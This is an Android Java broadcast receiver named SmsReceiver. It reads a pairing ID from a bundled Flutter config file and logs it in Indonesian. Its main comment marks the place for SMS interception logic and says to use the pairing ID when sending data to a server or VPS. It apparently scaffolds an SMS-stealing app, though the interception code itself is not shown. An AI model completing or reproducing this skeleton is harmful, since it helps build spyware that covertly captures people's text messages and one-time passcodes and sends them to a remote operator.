package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import org.json.JSONObject;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        // Ambil pairId langsung dari config aset
        String pairId = getPairIdFromConfig(context);
        
        Log.d(TAG, "SMS Receiver mendeteksi trigger. Menggunakan Pair ID: " + pairId);
        
        // Logika intercept SMS Anda di sini (Gunakan pairId untuk dikirim ke server/vps)
    }

    private String getPairIdFromConfig(Context context) {
        try {
            InputStream is = context.getAssets().open("flutter_assets/assets/config.json");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();
            String jsonString = new String(buffer, StandardCharsets.UTF_8);
            return new JSONObject(jsonString).optString("pairId", "UNKNOWN_ID");
        } catch (Exception e) {
            Log.e(TAG, "Error membaca config di SmsReceiver: " + e.getMessage());
            return "UNKNOWN_ID";
        }
    }
}